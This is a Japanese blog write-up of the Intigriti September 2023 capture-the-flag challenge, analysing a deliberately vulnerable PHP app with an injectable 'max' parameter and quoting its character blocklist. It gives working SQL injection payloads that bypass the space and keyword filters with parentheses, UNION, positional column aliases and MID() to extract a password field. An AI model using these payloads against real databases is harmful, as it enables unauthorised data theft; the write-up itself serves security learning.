---
title: "Intigrity 2023\nSeptember Challenge\nWriteup"
id: "intigrity-2023-september-challenge-writeup"
description: "Intigrity 2023 September Challenge WriteupのWriteupです。"
author: "rikoteki"
createdAt: "2023-10-05"
isDraft: false
---

#　アプリケーション調査

php製のサイトでユーザー一覧の機能があります。

![image](https://github.com/r1k0t3k1/note/assets/57973603/b9788cf0-824f-45ce-bce6-51eda38c3b6e)

画面下部の`Show source`をクリックすることでアプリケーション自体のソースコードが閲覧できます。

![image](https://github.com/r1k0t3k1/note/assets/57973603/4af70f4a-1c1c-403b-a56d-95ed1e5da67a)

以下のようにSQLが実行されているのが確認できます。

Prepared Statementを使用しておらず、SQLインジェクションの脆弱性があります。

```php
try{
//seen in production
$stmt = $pdo->prepare("SELECT id, name, email FROM users WHERE id<=$max");
$stmt->execute();
$results = $stmt->fetchAll();
}
catch(\PDOException $e){
    exit("ERROR: BROKEN QUERY");
} 
```

ただし、以下の部分で文字列フィルターが実装されており、禁止文字列を使用すると`H4ckerzzzz`のレスポンスが返るようになっています。

```php
if (isset($_GET['max']) && !is_array($_GET['max']) && $_GET['max']>0) {
    $max = $_GET['max'];
    $words  = ["'","\"",";","`"," ","a","b","h","k","p","v","x","or","if","case","in","between","join","json","set","=","|","&","%","+","-","<",">","#","/","\r","\n","\t","\v","\f"]; // list of characters to check
    foreach ($words as $w) {
        if (preg_match("#".preg_quote($w)."#i", $max)) {
            exit("H4ckerzzzz");
        } //no weird chars
    }       
}
```

また、SQLで取得したデータをHTMLに描画する際も文字列フィルターが存在し、`INTIGRITI`がカラムの値に含まれている場合、`REDACTED`に変換されます。

```php
<tbody>
  <?php foreach ($results as $row): ?>
    <tr>
      <td><?= htmlspecialchars(strpos($row['id'],"INTIGRITI")===false?$row['id']:"REDACTED"); ?></td> 
      <td><?= htmlspecialchars(strpos($row['name'],"INTIGRITI")===false?$row['name']:"REDACTED"); ?></td>
      <td><?= htmlspecialchars(strpos($row['email'],"INTIGRITI")===false?$row['email']:"REDACTED"); ?></td>
    </tr>
  <?php endforeach; ?>
</tbody> 
```

また、usersテーブルの構造も与えられます。

passwordフィールドが取得されていないのでフラグはおそらくpasswordにあると思います。

```sql
/* FYI
CREATE TABLE users (
    id INT AUTO_INCREMENT PRIMARY KEY,
    name VARCHAR(255) NOT NULL,
    email VARCHAR(255) UNIQUE NOT NULL,
    password VARCHAR(255) NOT NULL
);
*/ 
```


ここまででフラグを得る方針として、

- SQLインジェクションでUNION句を追加し、表示されていない`password`を表示させる。
- `INTIGRITI`フィルターを回避する。

を立てます。


# SQLインジェクションでUNION句を実行する

ソースコードからURLパラメータ`max`にSQLインジェクションがあることがわかっているのでUNION句を実行する方法を探します。

ただし、SQLフィルターにより多くの文字が使用できません。特にスペースが使用できないのは痛いです。

そこでスペース無しでSQLを実行する方法を探していると以下の記事がヒットしました。

[No spaces bypass](https://book.hacktricks.xyz/pentesting-web/sql-injection#no-spaces-bypass)

[No -*|%/ and no whitespace, is this SQL injectable?](https://security.stackexchange.com/questions/252464/no-and-no-whitespace-is-this-sql-injectable)

これらの記事によると、以下のSQLは

```sql
SELECT id, name FROM Users;
```

以下のように`()`を使用することで実行できるようです。

```sql
SELECT(id),(name)FROM(users);
```

試しに正しいカラム数の行を追加してみると、成功します。

```sql
max=1^(1)UNION(SELECT(1),2,3)
```

![image](https://github.com/r1k0t3k1/note/assets/57973603/c071211f-19d0-4ae7-a365-d0a89794f163)

次にUNIONでusersテーブルのpasswordをSELECTしたいところですが、SQLフィルターによって`p`や`a`などの文字が引っかかってしまいます。

```sql
/*selectでpasswordカラムを指定できない*/
max=1^(1)UNION(SELECT(id),name,(password)FROM(users))
```

そこで`テーブル名.カラムインデックス`でカラムを指定する方法を使用します。

[Bypass column names restriction](https://book.hacktricks.xyz/pentesting-web/sql-injection#bypass-column-names-restriction)

このSQLのid,nameは

```sql
SELECT id, name FROM users;
```

以下のSQL文で取得できます。

```sql
SELECT U.1,U.2 FROM (SELECT 1,2,3,4 UNION SELECT * FROM users)U
```

この方法を用いて以下のペイロードを作成します。

```
?max=1^(1)UNION(SELECT(U.1),U.2,(U.4)FROM(SELECT(1),2,3,(4)UNION(SELECT*FROM(users)))U)
```

このペイロードを送信すると編集されたパスワードフィールドが閲覧できます。

![image](https://github.com/r1k0t3k1/note/assets/57973603/3b37de58-eded-4984-b00a-238a24024086)

後は`INTIGRITI`フィルターを突破します。

SQLで取得した文字列に`INTIGRITI`という文字列が含まれていなければOKなので`MID`関数を使用します。

ここでもSQLフィルターは有効なので使える関数は限られてきます。

上記のペイロードの`U.4`をSELECTしている部分を下記のように変更して送信します。

フラグの２文字目から最後までを取得するという処理です。

```
?max=1^(1)UNION(SELECT(U.1),U.2,MID(U.4,2)FROM(SELECT(1),2,3,(4)UNION(SELECT*FROM(users)))U)
```

これでフィルターを回避してフラグを表示させることができます。(フラグの一文字目は`I`です。)

![image](https://github.com/r1k0t3k1/note/assets/57973603/77f389c5-7e67-4df9-983a-515755b33882)

まとめ
- SQLは`()`を使用することでスペースフィルターをバイパスできる
- SQLは列名をエイリアス化することで列名フィルターをバイパスできる
- PHPによる文字列フィルターはSQLの文字列関数を使用することでバイパスできる
